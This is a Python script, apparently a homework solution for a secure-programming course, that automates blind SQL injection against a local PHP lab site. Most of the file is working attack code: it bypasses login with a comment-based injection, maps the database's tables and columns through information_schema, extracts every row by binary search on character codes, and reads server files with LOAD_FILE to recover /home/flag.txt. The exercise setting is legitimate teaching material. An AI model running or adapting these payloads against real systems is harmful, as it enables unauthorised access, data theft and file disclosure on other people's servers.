"""
exercise_solver.py is made to run as a script that solves questions 5 and 7 of HW1 in the course safe programming.
"""
import base64
import os
from typing import List, Tuple, Callable
from urllib import request, parse

from misc import search_upper_bound, search_value


class BlindSQLiExerciseSolverException(Exception):
    """
    Exception thrown for errors inside the BlindSQLiExerciseSolver class.
    """
    pass


BLIND_SQLI_URL: str = "/blindsqli.php"
OS_SQLI_URL: str = "/os_sqli.php"


class BlindSQLiExerciseSolver:
    """
    Solves the parts of the exercise that utilize Blind SQL injections.
    """
    WEB_SERVER_HOSTNAME: str = "localhost"  # web-server host
    WEB_SERVER_PORT: int = 8000  # web server port
    USER_LOGIN_URL: str = "/login.php"  # login page path

    _EMPTY_PAGE_RESPONSE_TEST = '<td>\n\t\t\t\t\t\t\t\t\t\t\t</td>'  # literal found in blindsqli page for false answers

    class SQLInjections:
        """
        Stores the injection literals used inside the class.
        """
        LOGIN_USER_INJECTION = "{user_name}') -- "

        GET_ROW_COUNT = "?user={username}' " \
                        "and " \
                        "(select count(*) " \
                        "from {from_table} " \
                        "where {where_condition}" \
                        "){comparator}{length} -- "  # search for row count of query

        GET_VALUE_LENGTH = "?user={username}' " \
                           "and " \
                           "length((" \
                           "select {column_name} " \
                           "from {from_table} " \
                           "where {where_condition} " \
                           "LIMIT {row_index}, 1)){comparator}{length} -- "  # search for length of field in table

        GET_VALUE_CHAR = "?user={username}' " \
                         "and " \
                         "ascii(" \
                         "mid(" \
                         "(select {column_name} " \
                         "from {from_table} " \
                         "where {where_condition} " \
                         "LIMIT {row_index}, 1), " \
                         "{character_index}, 1)" \
                         "){comparator}{compare_ascii} -- "  # search for character of field in table

        GET_FILE_SIZE = "?user={username}' " \
                        "and " \
                        "length((" \
                        "select TO_BASE64(LOAD_FILE('{filename}')) " \
                        ")){comparator}{size} -- "  # search for size of file in sql-server filesystem

        GET_FILE_BASE64_CHAR = "?user={username}' " \
                               "and " \
                               "ascii(" \
                               "mid(" \
                               "(select TO_BASE64(LOAD_FILE('{filename}'))), " \
                               "{byte_index}, 1)" \
                               "){comparator}{compare_num} -- "  # search for character in base64 encoding of file

    def __init__(self, url: str):
        """
        :param url: page to run injections on
        """
        self._session_id = None
        self.logged_in = False
        self._logged_user = None
        self.injection_url = url

    def login(self, user_name: str):
        """
        logs in to website. Necessary for the other pages.
        :param user_name: user to login as.
        """
        login_url = f"http://{self.WEB_SERVER_HOSTNAME}:{self.WEB_SERVER_PORT}{self.USER_LOGIN_URL}"
        with request.urlopen(login_url) as login_page_response:
            set_cookie_values = login_page_response.info().get_all('Set-Cookie')
            cookie_parameters = set_cookie_values[0].split(';')
            cookie_name, cookie_value = cookie_parameters[0].split('=')
            if cookie_name != "PHPSESSID":
                raise BlindSQLiExerciseSolverException("Didn't find php session id")
            self._session_id = cookie_value
        login_data = f"uid={parse.quote_plus(self.SQLInjections.LOGIN_USER_INJECTION.format(user_name=user_name), safe='=')}&password="
        login_request = request.Request(login_url,
                                        data=login_data.encode(),
                                        headers={"Content-Type": "application/x-www-form-urlencoded",
                                                 "Cookie": f"PHPSESSID={self._session_id}"})
        with request.urlopen(login_request) as login_response:
            if f"Welcome {user_name}!" not in login_response.read().decode():
                raise BlindSQLiExerciseSolverException(f"failed to login to user {user_name}")
        self.logged_in = True
        self._logged_user = user_name

    def __is_query_true(self, sql_injection: str) -> bool:
        """
        runs a blind sql injection on the server
        :param sql_injection: query to run on the server
        :return: query result is True or False
        """
        if not self.logged_in:
            raise BlindSQLiExerciseSolverException("Can't run query without logging in first")
        quoted_sql_injection = sql_injection[:6] + parse.quote_plus(sql_injection[6:])
        full_query_url = f"http://{self.WEB_SERVER_HOSTNAME}:{self.WEB_SERVER_PORT}" \
                         f"{self.injection_url}{quoted_sql_injection}"
        query_request = request.Request(full_query_url,
                                        headers={"Cookie": f"PHPSESSID={self._session_id}"})
        with request.urlopen(query_request) as query_response:
            if self._EMPTY_PAGE_RESPONSE_TEST in query_response.read().decode():
                return False
        return True

    def __query_search(self, query_creator: Callable[[str, int], str], lower_bound: int = None,
                       upper_bound: int = None) -> int:
        """
        Performs a binary search using a blind-sqli query to harvest data off the server
        :param query_creator: function to create the query, receives comparator and value to compare
        :param lower_bound: lower bound to start with for the binary search
        :param upper_bound: upper bound to start with for the binary search, if None, we search for it
        :return: search result
        """

        def search_less_query(search_num: int) -> bool:
            query = query_creator('<', search_num)
            return self.__is_query_true(query)

        def search_more_query(search_num: int) -> bool:
            query = query_creator('>', search_num)
            return self.__is_query_true(query)

        if upper_bound is None:
            upper_bound = search_upper_bound(search_less_query)
            lower_bound = upper_bound // 2

        return search_value(lower_bound, upper_bound, search_less_query, search_more_query)

    def __find_row_cnt(self, from_table: str, where_condition: str) -> int:
        """
        Find row count of sql query result
        :param from_table: from clause content
        :param where_condition: where clause content
        :return:
        """

        def fill_query(comparator: str, query_cnt: int) -> str:
            return self.SQLInjections.GET_ROW_COUNT.format(
                username=self._logged_user,
                from_table=from_table,
                where_condition=where_condition,
                comparator=comparator,
                length=str(query_cnt))

        return self.__query_search(fill_query)

    def __find_value_len(self, column_name: str, from_table: str, where_condition: str, row_index: int) -> int:
        """
        Finds length of field inside table
        :param column_name: column of the field
        :param from_table: from clause content
        :param where_condition: where clause content
        :param row_index: row index of the field
        :return: field length
        """

        def fill_query(comparator: str, query_len: int) -> str:
            return self.SQLInjections.GET_VALUE_LENGTH.format(
                username=self._logged_user,
                column_name=column_name,
                from_table=from_table,
                where_condition=where_condition,
                row_index=str(row_index),
                comparator=comparator,
                length=str(query_len))

        return self.__query_search(fill_query)

    def __find_value_char(self, column_name: str, from_table: str, where_condition: str, row_index: int,
                          char_index: int) -> str:
        """
        Finds field character inside sql table
        :param column_name: column of the field
        :param from_table: from clause content
        :param where_condition: where clause content
        :param row_index: row index of the field
        :param char_index: index of the character of the field to find
        :return: field character
        """
        def fill_query(comparator: str, compare_ascii: int) -> str:
            return self.SQLInjections.GET_VALUE_CHAR.format(username=self._logged_user,
                                                            column_name=column_name,
                                                            from_table=from_table,
                                                            where_condition=where_condition,
                                                            row_index=str(row_index),
                                                            character_index=str(char_index + 1),
                                                            comparator=comparator,
                                                            compare_ascii=str(compare_ascii))

        search_res = self.__query_search(fill_query, lower_bound=32, upper_bound=128)
        return chr(search_res)

    def __find_file_size(self, filename: str) -> int:
        """
        Finds size of file on the sql server
        :param filename: path to file
        :return: file size
        """
        def fill_query(comparator: str, size: int) -> str:
            return self.SQLInjections.GET_FILE_SIZE.format(
                username=self._logged_user,
                filename=filename,
                comparator=comparator,
                size=str(size))

        return self.__query_search(fill_query)

    def __find_file_base64_char(self, filename: str, byte_index: int) -> str:
        """
        Finds base64 character of binary file in sql server filesystem
        :param filename: path to file
        :param byte_index: index of the character
        :return: character after base64 encoding
        """
        def fill_query(comparator: str, compare_num: int) -> str:
            return self.SQLInjections.GET_FILE_BASE64_CHAR.format(username=self._logged_user,
                                                                  filename=filename,
                                                                  byte_index=str(byte_index + 1),
                                                                  comparator=comparator,
                                                                  compare_num=str(compare_num))

        return chr(self.__query_search(fill_query, 32, 128))

    def __find_value(self, column_name: str, from_table: str, where_condition: str, row_index: int) -> str:
        """
        Finds value of field inside table
        :param column_name: column of the field
        :param from_table: from clause content
        :param where_condition: where clause content
        :param row_index: row index of the field
        :return: value of the field
        """
        value = ""
        value_len = self.__find_value_len(column_name, from_table, where_condition, row_index)
        for char_index in range(value_len):
            value += self.__find_value_char(column_name, from_table, where_condition, row_index, char_index)
        return value

    def get_database_table_names(self, database_name: str) -> List[str]:
        """
        Returns the names of the tables inside database
        :param database_name: name of database
        :return: list of names
        """
        database_table_cnt = self.__find_row_cnt(from_table='information_schema.tables',
                                                 where_condition=f'table_schema=\'{database_name}\'')
        table_names = []
        for table_index in range(database_table_cnt):
            table_name = self.__find_value(column_name='table_name',
                                           from_table='information_schema.tables',
                                           where_condition=f'table_schema=\'{database_name}\'',
                                           row_index=table_index)
            table_names.append(table_name)
        return table_names

    def get_table_column_names(self, database_name: str, table_name: str) -> List[str]:
        """
        Returns the names of columns inside of table
        :param database_name: name of database
        :param table_name: name of table
        :return: list of column names
        """
        columns_cnt = self.__find_row_cnt(from_table='information_schema.columns',
                                          where_condition=f'table_schema=\'{database_name}\' and '
                                                          f'table_name=\'{table_name}\'')
        column_names = []
        for column_index in range(columns_cnt):
            column_name = self.__find_value(column_name='column_name',
                                            from_table='information_schema.columns',
                                            where_condition=f'table_schema=\'{database_name}\' and '
                                                            f'table_name=\'{table_name}\'',
                                            row_index=column_index)
            column_names.append(column_name)
        return column_names

    def get_table_values(self, database_name: str, table_name: str, columns: List[str]) \
            -> List[Tuple[str, ...]]:
        """
        Returns all the rows inside sql table
        :param database_name: name of database
        :param table_name: name of table
        :param columns: names of columns inside table
        :return: list of tuples, tuple for each row
        """
        rows_count = self.__find_row_cnt(from_table=f'{database_name}.{table_name}',
                                         where_condition=f'1=1')
        table_values: List[Tuple[str, ...]] = []
        for row_index in range(rows_count):
            table_row = []
            for column in columns:
                value = self.__find_value(column_name=column,
                                          from_table=f'{database_name}.{table_name}',
                                          where_condition=f'1=1',
                                          row_index=row_index)
                table_row.append(value)
            table_values.append(tuple(table_row))
        return table_values

    def get_file_content(self, filename: str) -> bytes:
        """
        Return content of file inside sql server filesystem
        :param filename: path to file
        :return: bytes for file content
        """
        file_size = self.__find_file_size(filename)
        base64_content = ''
        for file_byte_index in range(file_size):
            base64_content += self.__find_file_base64_char(filename, file_byte_index)
        return base64.b64decode(base64_content)


def solve_exercise5():
    """
    Solves Exercise 5
    """
    sqli_solver = BlindSQLiExerciseSolver(BLIND_SQLI_URL)
    sqli_solver.login('bob')
    table_names = sqli_solver.get_database_table_names(database_name='secure')
    print(f"The Table Names are: {table_names}")
    for table_name in table_names:
        column_names = sqli_solver.get_table_column_names(database_name='secure', table_name=table_name)
        print(f"The column names in {table_name} are {column_names}")
        table_values = sqli_solver.get_table_values(database_name='secure', table_name=table_name, columns=column_names)
        print(f"The values in table {table_name} are {table_values}")
    print("~~~~~~~~~~~~~")


def solve_exercise7():
    """
    Solves Exercise 7
    """
    filename = '/home/flag.txt'
    sqli_solver = BlindSQLiExerciseSolver(BLIND_SQLI_URL)
    sqli_solver.login('bob')
    file_content = sqli_solver.get_file_content(filename)
    print(f"The content of the file {filename} are {file_content}, saving locally")
    with open(f'.{os.sep}flag.txt', 'bw') as flag_file:
        flag_file.write(file_content)
    print("~~~~~~~~~")


if __name__ == "__main__":
    solve_exercise5()
    solve_exercise7()
